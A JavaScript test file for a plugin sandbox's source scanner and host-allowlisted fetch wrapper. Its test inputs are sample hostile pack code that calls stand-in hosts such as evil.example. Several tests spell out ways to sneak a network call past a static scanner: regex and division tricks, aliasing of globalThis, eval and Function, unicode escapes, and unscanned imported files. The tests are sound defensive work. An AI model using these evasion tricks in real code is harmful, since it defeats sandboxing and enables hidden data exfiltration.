// SPDX-License-Identifier: LicenseRef-Ultrastable-USL-1.0
// Copyright (c) 2026 Rowan Brad Quni-Gudzinas. Non-commercial use free; commercial use requires a license. See LICENSE.
// Tests for the closed network path in the pack sandbox and the egress-allowlisted fetch (US-21-R27, R28).
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readdirSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { scanPackSource, createEgressFetch, hostAllowed, validateManifest, loadManifest } from './index.js';

const EXAMPLE_DIR = fileURLToPath(new URL('./example/', import.meta.url));
const PACKS_ROOT = fileURLToPath(new URL('../../packs/', import.meta.url));
const pack = (src) => { const d = mkdtempSync(path.join(tmpdir(), 'pack-net-')); writeFileSync(path.join(d, 'loop.js'), src); return d; };

test('T21-9 US-21-R27: a pack that calls global fetch, new WebSocket, XMLHttpRequest or imports cloudflare:sockets is refused at scan', () => {
  const cases = {
    "export async function run() { return fetch('https://evil.example/x'); }": /fetch without receiving it/,
    "export async function run() { return new WebSocket('wss://evil.example'); }": /network constructor/,
    "export async function run() { const x = new XMLHttpRequest(); return x; }": /network constructor/,
    "export async function run() { new EventSource('https://evil.example'); }": /network constructor/,
    "export async function run() { navigator.sendBeacon('https://evil.example', 'x'); }": /sendBeacon/,
    "import { connect } from 'cloudflare:sockets';\nexport async function run() { return connect; }": /imports cloudflare:sockets/,
    "import tls from 'node:tls';\nexport const t = tls;": /imports node:tls/,
    "import dns from 'dns';\nexport const t = dns;": /imports dns/,
    "import h from 'node:http2';\nexport const t = h;": /imports node:http2/,
  };
  for (const [src, re] of Object.entries(cases)) assert.match(scanPackSource(pack(src)).join(' '), re, src);
});

test('US-21-R27: globalThis.fetch and self.fetch are refused even when the file also declares a fetch parameter', () => {
  for (const call of ['globalThis.fetch(u)', 'self.fetch(u)', "globalThis['fetch'](u)"]) {
    const errs = scanPackSource(pack(`export function make({ fetch }) { return () => ${call}; }`));
    assert.match(errs.join(' '), /global fetch/, call);
  }
});

test('US-21-R27: a fetch the pack receives as a parameter or destructured binding is allowed', () => {
  assert.deepEqual(scanPackSource(pack(`export function a({ fetch }) { return (u) => fetch(u); }`)), []);
  assert.deepEqual(scanPackSource(pack(`export function b({ fetch: doFetch }) { return (u) => doFetch(u); }`)), []);
  assert.deepEqual(scanPackSource(pack(`export function c(fetch) { return (u) => fetch(u); }`)), []);
  assert.deepEqual(scanPackSource(pack(`export function d(o) { return (u) => o.fetch(u); }`)), []);   // a method on an injected object
});

test('T21-9 US-21-R27: the shipped packs and the example still pass the source scan', () => {
  const dirs = [EXAMPLE_DIR, ...readdirSync(PACKS_ROOT, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => path.join(PACKS_ROOT, e.name))];
  assert.ok(dirs.length >= 7);
  for (const d of dirs) assert.deepEqual(scanPackSource(d), [], d);
});

test('US-21-R28: createEgressFetch refuses http, an unlisted host and a lookalike suffix, and passes an allowed host and its subdomain', async () => {
  const seen = [], refused = [];
  const f = createEgressFetch({ fetch: async (u) => { seen.push(String(u)); return { ok: true }; }, hosts: ['bsky.social'], onRefuse: h => refused.push(h) });
  await assert.rejects(f('http://bsky.social/x'), /egress_refused:bsky\.social/);
  await assert.rejects(f('https://evil.example/x'), /egress_refused:evil\.example/);
  await assert.rejects(f('https://evilbsky.social/x'), /egress_refused/);
  await assert.rejects(f('not a url'), /egress_refused:invalid_url/);
  assert.deepEqual(seen, []);
  assert.deepEqual(refused, ['bsky.social', 'evil.example', 'evilbsky.social']);
  assert.deepEqual(await f('https://bsky.social/xrpc/a'), { ok: true });
  assert.deepEqual(await f('https://pds.bsky.social/xrpc/a'), { ok: true });
  assert.equal(seen.length, 2);
  assert.equal(hostAllowed('PDS.Bsky.Social', ['bsky.social']), true);
  assert.throws(() => createEgressFetch({ fetch: async () => ({}), hosts: [] }), /hosts required/);
  assert.throws(() => createEgressFetch({ hosts: ['a.example'] }), /fetch must be injected/);
});

test('US-21-R28: validateManifest refuses an outbound.hosts entry with a scheme, path, port or empty string, and accepts a bare host list', () => {
  const base = loadManifest(EXAMPLE_DIR);
  const withHosts = (hosts) => validateManifest({ ...base, outbound: { ...base.outbound, hosts } });
  assert.deepEqual(withHosts(['bsky.social', 'api.example.org']), []);
  for (const bad of ['https://bsky.social', 'bsky.social/path', 'bsky.social:443', '', 'nodots']) assert.match(withHosts([bad]).join(' '), /outbound\.hosts entries are bare host names/, bad);
  assert.match(withHosts([]).join(' '), /non-empty list/);
});

test('US-21-R24: a class D manifest whose scope.does says it deletes buckets is refused; a class B manifest is not asked the question', () => {
  const base = loadManifest(EXAMPLE_DIR);
  const d = { ...base, class: 'D', scope: { ...base.scope, does: ['Deletes storage buckets that are no longer used'] } };
  assert.match(validateManifest(d).join(' '), /delete_unowned_resources/);
  const d2 = { ...base, class: 'D', scope: { ...base.scope, does: ['Terminates idle servers to save cost'] } };
  assert.match(validateManifest(d2).join(' '), /delete_unowned_resources/);
  const ok = { ...base, class: 'D', scope: { ...base.scope, does: ['Deploys versions of its own units through the deploy path'] } };
  assert.doesNotMatch(validateManifest(ok).join(' '), /delete_unowned_resources/);
});

test('US-21-R24: a manifest that posts from the owner\'s personal account is refused, and every shipped manifest still validates', () => {
  const base = loadManifest(EXAMPLE_DIR);
  for (const line of ["Posts updates from the owner's personal account", 'Sends mail from a person\'s mailbox']) {
    const m = { ...base, scope: { ...base.scope, does: [line] } };
    assert.match(validateManifest(m).join(' '), /personal_account/, line);
  }
  for (const e of readdirSync(PACKS_ROOT, { withFileTypes: true }).filter(x => x.isDirectory())) {
    const m = loadManifest(path.join(PACKS_ROOT, e.name));
    assert.deepEqual(validateManifest(m), [], e.name);
  }
});

test('US-21-R02: covers must be a list of lower-case words; hooks accept only a known bounce entry inside the pack', () => {
  const base = loadManifest(EXAMPLE_DIR);
  assert.deepEqual(validateManifest({ ...base, covers: ['outreach', 'business'] }), []);
  assert.match(validateManifest({ ...base, covers: ['Outreach'] }).join(' '), /covers must be a list of lower-case words/);
  assert.match(validateManifest({ ...base, covers: 'outreach' }).join(' '), /covers must be a list/);
  assert.deepEqual(validateManifest({ ...base, hooks: { bounce: './bounce.js#onBounce' } }), []);
  assert.match(validateManifest({ ...base, hooks: { bounce: '../x.js#a' } }).join(' '), /inside the pack directory/);
  assert.match(validateManifest({ ...base, hooks: { other: './x.js#a' } }).join(' '), /not a known hook/);
});

// The four bypasses a regex scan let through (US-21-R27): each is a one-file pack the scan now refuses, and the honest forms still pass.
test('US-21-R27: a string holding // does not hide a global fetch call on the same line', () => {
  const errs = scanPackSource(pack('export const note = "x//"; export async function run() { return fetch("https://evil.example/x"); }'));
  assert.match(errs.join(' '), /fetch without receiving it/);
});

test('US-21-R27: destructuring fetch from the global object is refused, whatever the binding looks like', () => {
  const errs = scanPackSource(pack('const { fetch } = globalThis;\nexport async function run() { return fetch("https://evil.example/x"); }'));
  assert.match(errs.join(' '), /globalThis as a value/);
  assert.match(scanPackSource(pack('const g = self; export const x = g.fetch;')).join(' '), /self as a value/);
});

test('US-21-R27: aliasing the global fetch is refused: the name is read without being bound', () => {
  const errs = scanPackSource(pack('export async function run() { const f = fetch; return f("https://evil.example/x"); }'));
  assert.match(errs.join(' '), /fetch without receiving it/);
  assert.match(scanPackSource(pack('export const run = (a = fetch) => a("u");')).join(' '), /fetch without receiving it/, 'a default value reads the global, it does not bind it');
});

test('US-21-R27: a fetch parameter in one function does not legitimise a bare fetch in another, and computed access on the global object is refused', () => {
  const errs = scanPackSource(pack('export const make = ({ fetch }) => (u) => fetch(u);\nexport function leak() { return fetch("https://evil.example/x"); }'));
  assert.match(errs.join(' '), /fetch without receiving it/);
  assert.match(scanPackSource(pack('export const run = () => globalThis["fe" + "tch"]("u");')).join(' '), /computed access on globalThis/);
  assert.match(scanPackSource(pack('export const run = () => new (globalThis.WebSocket)("wss://x");')).join(' '), /reads globalThis\.WebSocket|network constructor/);
});

test('US-21-R27: the honest forms still pass: a parameter, a renamed key, an injected object, text that mentions fetch, and typeof fetch', () => {
  const ok = [
    'export const make = ({ fetch, env = {} }) => async (u) => { const r = await fetch(u, { method: "GET" }); return r; };',
    'export function f(deps) { const { fetch } = deps; return fetch("u"); }',
    'export const f = ({ fetch: doFetch }) => doFetch("u"); export const s = "fetch(x) // here", t = `${1} fetch(y)`; /* fetch(z) */',
    'export const f = (deps) => deps.fetch("u") + (typeof fetch);',
    'export const f = (x) => x.replace(/\\/+$/, "") + "http://example.com";',
  ];
  for (const src of ok) assert.deepEqual(scanPackSource(pack(src)), [], src);
});

// ---------------- the host builds the egress fetch from the manifest (US-21-R28) ----------------
import { makeDb } from '../_shared/testdb.js';
import { KERNEL_DIR } from '../kernel/testkit.js';
import { createPacks, MIGRATIONS_DIR } from './index.js';

test('US-21-R28: packs.egressFetch limits a pack\'s fetch to its manifest outbound.hosts, records a refusal, and gives a pack with no declared hosts no network', async () => {
  const mk = () => { const db = makeDb([KERNEL_DIR, MIGRATIONS_DIR]); return { db, packs: createPacks({ db, now: () => 1700000000000, config: {}, channels: {} }) }; };
  const base = loadManifest(EXAMPLE_DIR);
  const { db, packs } = mk();
  assert.equal((await packs.register({ ...base, outbound: { ...base.outbound, hosts: ['api.example.com'] } })).ok, true);
  const seen = [];
  const f = await packs.egressFetch('example', { fetch: async (u) => { seen.push(String(u)); return { ok: true }; } });
  assert.deepEqual(await f('https://api.example.com/v1/x'), { ok: true });
  await assert.rejects(f('https://evil.example/x'), /egress_refused:evil\.example/);
  await assert.rejects(f('http://api.example.com/x'), /egress_refused/);
  assert.deepEqual(seen, ['https://api.example.com/v1/x']);
  await new Promise(r => setImmediate(r));
  assert.deepEqual(packs.egressRefusals().map(x => x.host), ['evil.example', 'api.example.com']);
  assert.equal(db.raw.prepare(`SELECT COUNT(*) n FROM packs_runs WHERE pack_id = 'example' AND outcome = 'egress_refused'`).get().n, 2);
  const quiet = mk();
  assert.equal((await quiet.packs.register(base)).ok, true);
  await assert.rejects(quiet.packs.egressFetch('example', { fetch: async () => ({}) }), /egress_hosts_not_declared:example/);
  await assert.rejects(quiet.packs.egressFetch('nope', { fetch: async () => ({}) }), /unknown_pack/);
});

test('US-21-R28: the shipped packs that call a fixed provider declare their hosts, and the declared hosts are the ones their channel code names', () => {
  const email = JSON.parse(readFileSync(path.join(PACKS_ROOT, 'email/pack.json'), 'utf8')), video = JSON.parse(readFileSync(path.join(PACKS_ROOT, 'video/pack.json'), 'utf8'));
  assert.deepEqual(email.outbound.hosts, ['api.cloudflare.com']);
  assert.deepEqual(video.outbound.hosts, ['oauth2.googleapis.com', 'www.googleapis.com', 'www.youtube.com']);
  assert.deepEqual(validateManifest(email, {}), []); assert.deepEqual(validateManifest(video, {}), []);
  for (const [dir, hosts] of [['email/channels', email.outbound.hosts], ['video/channels', video.outbound.hosts]]) {
    const named = new Set();
    for (const f of readdirSync(path.join(PACKS_ROOT, dir)).filter(n => n.endsWith('.js') && !n.endsWith('.test.js'))) for (const m of readFileSync(path.join(PACKS_ROOT, dir, f), 'utf8').matchAll(/https:\/\/([a-z0-9.-]+)/gi)) named.add(m[1]);
    for (const h of named) assert.ok(hosts.some(x => hostAllowed(h, [x])), `${dir} calls ${h}, which the manifest does not declare`);
  }
});

// ---------------- T21-19: what the token scan still let through (US-21-R27) ----------------
const packFiles = (files) => {
  const d = mkdtempSync(path.join(tmpdir(), 'pack-files-'));
  for (const [rel, src] of Object.entries(files)) { mkdirSync(path.dirname(path.join(d, rel)), { recursive: true }); writeFileSync(path.join(d, rel), src); }
  return d;
};

test('T21-19 US-21-R27: a division after a name spelled like a keyword does not hide the code after it', () => {
  const errs = scanPackSource(pack('export function run() {\n  const of = 4;\n  const r = of / 2; return fetch("https://evil.example/x");\n}\n'));
  assert.match(errs.join(' '), /fetch without receiving it/);
  assert.match(scanPackSource(pack('export const run = (x) => x.return / 2 + fetch("u");')).join(' '), /fetch without receiving it/, 'a keyword read as a property is a name');
  assert.deepEqual(scanPackSource(pack('export const f = (s) => { if (typeof s === "string") return /a\\/b/.test(s); return /x/g; };')), [], 'a regex after return or an operator stays a regex');
});

test('T21-19 US-21-R27: a / after ), }, ${ or ++ is read as the engine reads it, so a quote inside a regex or a string never hides a later fetch', () => {
  // Each source calls the global fetch when it runs (the engine reads a regex where the regex is, a division where the division is), so each must be refused.
  const hidden = {
    'after the head of if': "export function run(a) { if (a) /'/.test(a); fetch('https://evil.example/1'); //'\n  return 1; }",
    'after the head of for': "export function run(a) { for (const k of [1]) /'/.test(a); fetch('https://evil.example/2'); //'\n  return 1; }",
    'after the head of while': "export function run(a) { while (a--) /'/.test(a); fetch('https://evil.example/3'); //'\n  return 1; }",
    'after a function declaration': "export function run(a) { return a ? 1 : 2 } /'/.test(''); fetch('https://evil.example/5'); //'\n",
    'after a labelled block': "export function run() { label: { } /'/.test(''); fetch('https://evil.example/7'); //'\n}",
    'after a statement block': "export function run(a) { if (a) { a = 2 } /'/.test(''); fetch('https://evil.example/8'); //'\n}",
    'after a class declaration': "class A {} /'/.test(''); fetch('https://evil.example/9'); //'\nexport const run = () => 1;",
    'after an arrow body and a new line': "export const run = () => {}\n/'/.test(''); fetch('https://evil.example/10'); //'\n",
    'inside a template expression': "export function run() { const t = `${/'/.source}`; fetch('https://evil.example/t1'); //'\n  return t; }",
    'a division after a postfix ++': "export function run() { let i = 0; i++ / '/'; fetch('https://evil.example/t2'); //'\n  return i; }",
    'a division after a call': "export function run(a) { const r = String(a) / '/'; fetch('https://evil.example/d1'); //'\n  return r; }",
    'a division after an object literal': "export function run() { const r = {a: 1} / '/'; fetch('https://evil.example/d2'); //'\n  return r; }",
    'a division after a function expression': "export function run() { const g = function () {} / '/'; fetch('https://evil.example/d3'); //'\n  return g; }",
    'a division after an async function expression': "export function run() { const g = async function () {} / '/'; fetch('https://evil.example/t3'); //'\n  return g; }",
  };
  for (const [why, src] of Object.entries(hidden)) assert.match(scanPackSource(pack(src)).join(' '), /fetch without receiving it/, why);
  const ok = ['export const f = (s) => { if (s) /a\\/b/.test(s); return (s.length) / 2; };', 'export const g = (n) => { let i = n; i++; return { a: i }.a / 2; };',
    'export function h(fetch) { if (fetch) { } /x/.test("y"); return fetch("u"); }', 'export const t = (x) => `${/re/.source}${x / 2}`;'];
  for (const src of ok) assert.deepEqual(scanPackSource(pack(src)), [], src);
});

test('T21-19 US-21-R27: a call followed by a block on the next line does not bind the names in its arguments', () => {
  const errs = scanPackSource(pack('export function run() {\n  String(fetch)\n  { return fetch("https://evil.example/x") }\n}\n'));
  assert.match(errs.join(' '), /fetch without receiving it/);
  const ok = ['export class C { send(fetch) { return fetch("u"); } }', 'export const o = { send(fetch) { return fetch("u"); }, async other(fetch) { return fetch("v"); } };',
    'export function make(fetch) { return fetch("u"); }', 'export const f = function (fetch) { return fetch("u"); };', 'export class D { static make(fetch) { return fetch("u"); } }'];
  for (const src of ok) assert.deepEqual(scanPackSource(pack(src)), [], src);
});

test('T21-19 US-21-R27: code built from text is refused in every form: Function without new, indirect eval, .constructor and a unicode escape', () => {
  const bad = {
    'export const run = () => Function("return fe" + "tch")()("u");': /eval, Function/,
    'export const run = () => (0, eval)("fe" + "tch")("u");': /eval, Function/,
    'export const run = () => (() => 0).constructor("return fe" + "tch")()("u");': /\.constructor/,
    'export const run = () => (() => 0)["constructor"]("return 1")();': /\['constructor'\]/,
    'export const run = () => \\u0066etch("https://evil.example/x");': /unicode escape/,
  };
  for (const [src, re] of Object.entries(bad)) assert.match(scanPackSource(pack(src)).join(' '), re, src);
  assert.deepEqual(scanPackSource(pack('export class E { constructor(fetch) { this.fetch = fetch; } }')), [], 'a class constructor is a method, not a read of .constructor');
});

test('T21-19 US-21-R27: a pack cannot load code the scan did not read: a .cjs file, a test file, node_modules or a bare package name', () => {
  const base = loadManifest(EXAMPLE_DIR);
  const evil = 'module.exports = (u) => fetch(u);';
  const cases = [
    { 'index.js': 'import leak from "./helper.cjs"; export const run = () => leak("u");', 'helper.cjs': evil },
    { 'index.js': 'import leak from "./net.test.js"; export const run = () => leak("u");', 'net.test.js': 'export default (u) => globalThis.fetch(u);' },
    { 'index.js': 'import leak from "./node_modules/leakpkg/index.js"; export const run = () => leak("u");', 'node_modules/leakpkg/index.js': 'export default (u) => fetch(u);' },
    { 'index.js': 'import leak from "leakpkg"; export const run = () => leak("u");', 'node_modules/leakpkg/index.js': 'export default (u) => fetch(u);' },
    { 'index.js': 'export const run = async () => (await import("./missing.js")).default("u");' },
  ];
  for (const files of cases) assert.match(scanPackSource(packFiles(files)).join(' '), /source scan (cannot|does not) read/, Object.keys(files).join(','));
  assert.deepEqual(scanPackSource(packFiles({ 'index.js': 'import data from "./data.json" with { type: "json" }; import { h } from "./lib/h.js"; export const run = () => h(data);', 'lib/h.js': 'export const h = (x) => x;', 'data.json': '{}' })), [], 'scanned modules and json data inside the pack are fine');
  assert.match(validateManifest({ ...base, loops: [{ ...base.loops[0], entry: './net.test.js#run' }] }).join(' '), /not a test file/);
  assert.match(validateManifest({ ...base, hooks: { bounce: './node_modules/x/index.js#onBounce' } }).join(' '), /not a test file or a dependency/);
});

test('T21-10 US-21-R28: a redirect is followed only to an allowed host; a 30x to an unlisted host is refused and never fetched', async () => {
  const calls = [];
  const res = (status, location) => ({ status, headers: { get: (h) => (h.toLowerCase() === 'location' ? location ?? null : null) } });
  const routes = { 'https://api.example.com/a': res(302, 'https://evil.test/steal'), 'https://api.example.com/b': res(301, '/c'), 'https://api.example.com/c': res(200) };
  const fetch = async (url, init) => { calls.push([String(url), init && init.redirect]); return routes[String(url)] || res(404); };
  const ef = createEgressFetch({ fetch, hosts: ['example.com'] });
  await assert.rejects(() => ef('https://api.example.com/a'), /egress_refused:evil\.test/);
  assert.ok(!calls.some(([u]) => u.startsWith('https://evil.test')), 'the unlisted host was never called');
  assert.equal((await ef('https://api.example.com/b')).status, 200, 'a redirect inside the list is followed');
  assert.ok(calls.every(([, r]) => r === 'manual'), 'every hop is fetched with redirect manual, so the platform never follows one on its own');
});
